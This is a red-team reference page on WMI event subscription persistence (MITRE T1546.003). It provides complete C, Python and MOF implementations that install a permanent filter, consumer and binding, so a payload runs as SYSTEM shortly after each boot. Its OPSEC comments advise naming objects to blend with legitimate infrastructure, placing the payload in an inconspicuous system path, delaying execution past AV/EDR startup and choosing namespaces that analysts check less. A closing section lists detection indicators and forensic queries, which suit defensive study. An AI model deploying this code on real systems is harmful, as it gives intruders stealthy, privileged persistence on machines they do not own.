# WMI Event Subscription - Code Implementations

MITRE ATT&CK: T1546.003 - Event Triggered Execution: WMI Event Subscription

> **Authorized security testing only.** These code patterns are reference material for red team professionals operating under explicit written authorization.

## Overview

Windows Management Instrumentation (WMI) provides a built-in eventing model that allows code execution in response to system events. A **permanent WMI event subscription** consists of three objects stored in the WMI repository (CIM database) that survive reboots. This technique is attractive because it uses only built-in OS components with no files on disk (beyond the WMI repository itself) and executes through the legitimate WMI service process (`svchost.exe` hosting `WinMgmt`).

See also: [WMI Persistence (Narrative)](../../04-persistence/wmi-persistence.md)

## WMI Eventing Model

```
__EventFilter  <--->  __FilterToConsumerBinding  <--->  __EventConsumer
(WQL query:           (links filter to consumer;       (CommandLineEventConsumer,
 WHEN to fire)         all 3 must exist)                ActiveScriptEventConsumer, etc.
                                                        WHAT to execute)
         |                                                    |
         |  WQL: SELECT * FROM __InstanceModificationEvent    |  CommandLineTemplate =
         |    WITHIN 60 WHERE ... SystemUpTime >= 240         |    "cmd.exe /c payload.exe"
         |                                                    v
         +---> WMI service (WinMgmt) evaluates filter ---> launches consumer action
              (scrcons.exe for ActiveScript, or direct cmd execution)

PERMANENT: stored in WMI repository (wbem\Repository\), survives reboots.
TEMPORARY: in-memory only, dies with creating process -- NOT for persistence.
```

## Consumer Types

| Consumer Class | What It Does | Process Spawned | OPSEC Notes |
|---|---|---|---|
| `CommandLineEventConsumer` | Executes a command line | `cmd.exe` or direct | Command visible in process creation logs |
| `ActiveScriptEventConsumer` | Runs VBScript/JScript | `scrcons.exe` | scrcons.exe spawning is a HIGH-FIDELITY detection signal |
| `LogFileEventConsumer` | Writes to a log file | None (in-process) | Can be abused for DLL side-loading via path traversal |
| `NTEventLogEventConsumer` | Writes to Event Log | None (in-process) | Legitimate-looking but limited utility |
| `SMTPEventConsumer` | Sends email | None (in-process) | Requires SMTP config; rarely used offensively |

## C Implementation: WMI Event Subscription via COM

```c
/*
 * wmi_persist.c
 * Creates a permanent WMI event subscription using COM/IWbemServices.
 *
 * This implementation creates all three required objects:
 *   1. __EventFilter (defines the trigger condition)
 *   2. CommandLineEventConsumer (defines what to execute)
 *   3. __FilterToConsumerBinding (links them together)
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 19: WmiEventFilter activity detected
 *   - Sysmon Event 20: WmiEventConsumer activity detected
 *   - Sysmon Event 21: WmiEventConsumerToFilter activity detected
 *   - Microsoft-Windows-WMI-Activity/Operational log
 *   - WMI repository modification (OBJECTS.DATA file timestamp)
 *   - Consumer execution: new process creation from wmiprvse.exe or svchost.exe
 *
 * Compile: cl.exe /W4 /Fe:wmipersist.exe wmi_persist.c ole32.lib oleaut32.lib wbemuuid.lib
 */

#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "wbemuuid.lib")

/* Helper: Connect to a WMI namespace and return IWbemServices pointer */
HRESULT ConnectToWMI(LPCWSTR namespacePath, IWbemServices **ppSvc) {
    IWbemLocator *pLoc = NULL;
    HRESULT hr;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) return hr;

    /* OPSEC: Namespace choice matters.
     *   root\subscription -- standard namespace for event subscriptions.
     *     This is where defensive tools look first.
     *   root\default -- alternative namespace; some older tools do not
     *     enumerate subscriptions here. Sysmon 14+ covers both.
     *   root\cimv2 -- NOT valid for permanent subscriptions; the
     *     __EventFilter class does not exist here by default. */
    BSTR bstrNamespace = SysAllocString(namespacePath);
    hr = pLoc->lpVtbl->ConnectServer(pLoc, bstrNamespace,
                                      NULL, NULL, NULL, 0, NULL, NULL, ppSvc);
    SysFreeString(bstrNamespace);
    pLoc->lpVtbl->Release(pLoc);

    if (FAILED(hr)) return hr;

    /* Set security blanket for impersonation */
    hr = CoSetProxyBlanket((IUnknown*)*ppSvc, RPC_C_AUTHN_WINNT,
                           RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL,
                           RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    return hr;
}

/* Helpers: set string/uint32 property on a WMI instance */
void PutStringProp(IWbemClassObject *pObj, LPCWSTR name, LPCWSTR val) {
    VARIANT v; VariantInit(&v); v.vt = VT_BSTR;
    v.bstrVal = SysAllocString(val);
    pObj->lpVtbl->Put(pObj, name, 0, &v, 0); VariantClear(&v);
}
void PutUint32Prop(IWbemClassObject *pObj, LPCWSTR name, UINT32 val) {
    VARIANT v; VariantInit(&v); v.vt = VT_I4; v.lVal = (LONG)val;
    pObj->lpVtbl->Put(pObj, name, 0, &v, 0); VariantClear(&v);
}

int CreateWMISubscription(void) {
    HRESULT hr;
    IWbemServices *pSvc = NULL;
    IWbemClassObject *pClass = NULL;
    IWbemClassObject *pInstance = NULL;

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return -1;

    hr = ConnectToWMI(L"root\\subscription", &pSvc);
    if (FAILED(hr)) { CoUninitialize(); return -1; }

    /* ================================================================
     * STEP 1: Create the __EventFilter
     * ================================================================
     * The WQL query defines when the consumer fires.
     *
     * OPSEC: The polling interval (WITHIN clause) affects both
     * reliability and stealth:
     *   WITHIN 60   -- checks every 60s, responsive but more WMI activity
     *   WITHIN 600  -- checks every 10min, less noise in WMI logs
     *   WITHIN 3600 -- checks every hour, minimal noise but delayed trigger
     *
     * Common trigger patterns:
     *   - System uptime threshold (fires once after boot)
     *   - Process start (Win32_ProcessStartTrace)
     *   - User logon (Win32_LogonSession creation)
     *   - Time of day (Win32_LocalTime)
     */
    BSTR bstrFilterClass = SysAllocString(L"__EventFilter");
    hr = pSvc->lpVtbl->GetObject(pSvc, bstrFilterClass, 0, NULL, &pClass, NULL);
    SysFreeString(bstrFilterClass);
    if (FAILED(hr)) goto cleanup;

    hr = pClass->lpVtbl->SpawnInstance(pClass, 0, &pInstance);
    pClass->lpVtbl->Release(pClass);
    if (FAILED(hr)) goto cleanup;

    /* DETECTION: The filter Name appears in Sysmon Event 19.
     * Use a name that blends with legitimate WMI infrastructure.  */
    PutStringProp(pInstance, L"Name", L"SCM Event Log Filter");

    /* WQL query: fire when system uptime exceeds 240 seconds.
     * OPSEC: This effectively means "4 minutes after boot" -- enough
     * time for AV/EDR to initialize but early enough to establish access. */
    PutStringProp(pInstance, L"QueryLanguage", L"WQL");
    PutStringProp(pInstance, L"Query",
        L"SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
        L"AND TargetInstance.SystemUpTime >= 240");

    PutStringProp(pInstance, L"EventNamespace", L"root\\cimv2");

    /* PutInstance: writes the object to the WMI repository.
     * DETECTION: This is when Sysmon Event 19 fires. */
    hr = pSvc->lpVtbl->PutInstance(pSvc, pInstance, WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);
    pInstance->lpVtbl->Release(pInstance);
    pInstance = NULL;
    if (FAILED(hr)) { printf("[!] Filter creation failed: 0x%lx\n", hr); goto cleanup; }
    printf("[+] EventFilter created.\n");

    /* ================================================================
     * STEP 2: Create the CommandLineEventConsumer
     * ================================================================
     * DETECTION: Sysmon Event 20 fires when the consumer is created.
     * The CommandLineTemplate value is captured in the event. */
    BSTR bstrConsumerClass = SysAllocString(L"CommandLineEventConsumer");
    hr = pSvc->lpVtbl->GetObject(pSvc, bstrConsumerClass, 0, NULL, &pClass, NULL);
    SysFreeString(bstrConsumerClass);
    if (FAILED(hr)) goto cleanup;

    hr = pClass->lpVtbl->SpawnInstance(pClass, 0, &pInstance);
    pClass->lpVtbl->Release(pClass);
    if (FAILED(hr)) goto cleanup;

    PutStringProp(pInstance, L"Name", L"SCM Event Log Consumer");

    /* OPSEC: The CommandLineTemplate is stored in cleartext in the WMI
     * repository and appears in Sysmon Event 20. Use an executable path
     * that does not look suspicious. Avoid obvious names like payload.exe.
     *
     * The command runs as SYSTEM because the WMI service runs as SYSTEM. */
    PutStringProp(pInstance, L"CommandLineTemplate",
        L"C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\svcdiag.exe");

    hr = pSvc->lpVtbl->PutInstance(pSvc, pInstance, WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);
    pInstance->lpVtbl->Release(pInstance);
    pInstance = NULL;
    if (FAILED(hr)) { printf("[!] Consumer creation failed: 0x%lx\n", hr); goto cleanup; }
    printf("[+] CommandLineEventConsumer created.\n");

    /* ================================================================
     * STEP 3: Create the __FilterToConsumerBinding
     * ================================================================
     * This links the filter to the consumer. Without this binding,
     * the subscription is inert.
     * DETECTION: Sysmon Event 21 fires. */
    BSTR bstrBindingClass = SysAllocString(L"__FilterToConsumerBinding");
    hr = pSvc->lpVtbl->GetObject(pSvc, bstrBindingClass, 0, NULL, &pClass, NULL);
    SysFreeString(bstrBindingClass);
    if (FAILED(hr)) goto cleanup;

    hr = pClass->lpVtbl->SpawnInstance(pClass, 0, &pInstance);
    pClass->lpVtbl->Release(pClass);
    if (FAILED(hr)) goto cleanup;

    /* The Filter and Consumer properties are WMI object paths (references).
     * Format: <ClassName>.Name="<InstanceName>" */
    PutStringProp(pInstance, L"Filter",
        L"__EventFilter.Name=\"SCM Event Log Filter\"");
    PutStringProp(pInstance, L"Consumer",
        L"CommandLineEventConsumer.Name=\"SCM Event Log Consumer\"");

    hr = pSvc->lpVtbl->PutInstance(pSvc, pInstance, WBEM_FLAG_CREATE_OR_UPDATE,
                                    NULL, NULL);
    pInstance->lpVtbl->Release(pInstance);
    pInstance = NULL;
    if (FAILED(hr)) { printf("[!] Binding creation failed: 0x%lx\n", hr); goto cleanup; }
    printf("[+] FilterToConsumerBinding created.\n");
    printf("[+] WMI event subscription installed successfully.\n");

cleanup:
    if (pSvc) pSvc->lpVtbl->Release(pSvc);
    CoUninitialize();
    return SUCCEEDED(hr) ? 0 : -1;
}

int main(void) {
    return CreateWMISubscription();
}
```

## Python Implementation

```python
"""
wmi_persist.py
Creates a permanent WMI event subscription using the Python wmi module.

Requirements: pip install wmi pywin32
Must run as Administrator (WMI subscription creation requires admin).

DETECTION ARTIFACTS: Same as C implementation -- Sysmon 19/20/21,
WMI-Activity operational log. The additional artifact is that python.exe
(or the compiled PyInstaller binary) is the process creating the WMI objects,
which may or may not be suspicious depending on environment.
"""

import wmi  # pip install wmi

def create_wmi_subscription():
    # Connect to root\subscription namespace
    # OPSEC: Some operators connect to root\default instead.
    # The wmi module defaults to root\cimv2 -- we must override.
    c = wmi.WMI(namespace="root/subscription")

    # --- Step 1: Create EventFilter ---
    # OPSEC: The Name should blend with legitimate WMI filters.
    # Enterprise environments often have filters from SCCM, Intune, etc.
    event_filter = c.new("__EventFilter")
    event_filter.Name = "BVTFilter"
    event_filter.QueryLanguage = "WQL"
    event_filter.Query = (
        "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
        "AND TargetInstance.SystemUpTime >= 240"
    )
    event_filter.EventNamespace = "root\\cimv2"
    filter_path = event_filter.put()
    print(f"[+] EventFilter created: {filter_path}")

    # --- Step 2: Create CommandLineEventConsumer ---
    consumer = c.new("CommandLineEventConsumer")
    consumer.Name = "BVTConsumer"
    consumer.CommandLineTemplate = (
        r"C:\Windows\System32\config\systemprofile\AppData\Local\svcdiag.exe"
    )
    # ExecutablePath can also be set separately from CommandLineTemplate.
    # If both are set, ExecutablePath takes precedence for the binary
    # and CommandLineTemplate provides the full command line.
    consumer_path = consumer.put()
    print(f"[+] Consumer created: {consumer_path}")

    # --- Step 3: Create FilterToConsumerBinding ---
    binding = c.new("__FilterToConsumerBinding")
    binding.Filter = filter_path        # WMI object path from step 1
    binding.Consumer = consumer_path    # WMI object path from step 2
    binding_path = binding.put()
    print(f"[+] Binding created: {binding_path}")
    print("[+] WMI persistence installed.")


def remove_wmi_subscription():
    """Cleanup: remove in reverse order (binding -> consumer -> filter)."""
    c = wmi.WMI(namespace="root/subscription")
    for b in c.query("SELECT * FROM __FilterToConsumerBinding WHERE Filter = \"__EventFilter.Name=\\\"BVTFilter\\\"\""):
        b.delete_(); print("[+] Binding removed.")
    for co in c.query("SELECT * FROM CommandLineEventConsumer WHERE Name = 'BVTConsumer'"):
        co.delete_(); print("[+] Consumer removed.")
    for f in c.query("SELECT * FROM __EventFilter WHERE Name = 'BVTFilter'"):
        f.delete_(); print("[+] Filter removed.")


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--remove":
        remove_wmi_subscription()
    else:
        create_wmi_subscription()
```

## MOF File Compilation Approach

```
/* persist.mof -- Compile: mofcomp.exe persist.mof
 * DETECTION: mofcomp.exe process creation (high-fidelity signal -- rarely used
 * legitimately), MOF file on disk (Sysmon 11), plus Sysmon 19/20/21.
 * OPSEC: COM API is preferred; mofcomp.exe is monitored by most EDR. */

#pragma namespace("\\\\.\\root\\subscription")

instance of __EventFilter as $Filter
{
    Name  = "WindowsParentalControls";
    EventNamespace = "root\\cimv2";
    QueryLanguage  = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 "
            "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' "
            "AND TargetInstance.SystemUpTime >= 240";
};

instance of CommandLineEventConsumer as $Consumer
{
    Name = "WindowsParentalControlsConsumer";
    CommandLineTemplate = "C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\svcdiag.exe";
};

instance of __FilterToConsumerBinding
{
    Filter   = $Filter;
    Consumer = $Consumer;
};
```

## Namespace OPSEC Tradeoffs

| Namespace | Valid for Subscriptions | Monitored by Sysmon | EDR Coverage | Notes |
|---|---|---|---|---|
| `root\subscription` | Yes (standard) | Yes (Events 19/20/21) | Very High | Default; well-documented; first place analysts check |
| `root\default` | Yes | Yes (Sysmon 14+) | High | Less commonly checked by manual analysis; automated tools cover it |
| `root\cimv2` | No (classes not present) | N/A | N/A | Cannot host permanent subscriptions |
| Custom namespace | Possible (requires class registration) | Partial | Low | Exotic; creating namespaces is itself suspicious |

## Detection Indicators

- **Sysmon Event 19** (WmiEventFilter): captures filter Name, Query, EventNamespace on creation.
- **Sysmon Event 20** (WmiEventConsumer): captures consumer Name, Type, and Destination (command/script).
- **Sysmon Event 21** (WmiEventConsumerToFilter): captures the binding between filter and consumer.
- **WMI-Activity/Operational Event 5861**: permanent subscription created (namespace, query, consumer, creator PID).
- **Process-based**: payload spawns from `svchost.exe` (WinMgmt) or `wmiprvse.exe`. For ActiveScriptEventConsumer, `scrcons.exe` is the parent -- a very high-fidelity detection signal.

### Detection Queries

```
# Sysmon: scrcons.exe spawning child processes
index=sysmon EventCode=1 ParentImage="*\\scrcons.exe"
| table _time, Image, CommandLine, ParentCommandLine, User
```

```powershell
# Enumerate all permanent subscriptions (forensics)
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class __EventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding
Get-WMIObject -Namespace root\default -Class __EventFilter  # also check root\default
```

## Cross-References

- [WMI Persistence (Narrative)](../../04-persistence/wmi-persistence.md)
- [Scheduled Task Creation (Code)](scheduled-task-creation.md) -- time-based alternative
- [Registry Persistence (Code)](registry-persistence-code.md) -- simpler persistence
- [Service Persistence (Code)](service-persistence.md) -- service-based alternative
- [Detection Engineering](../../12-detection-engineering/)
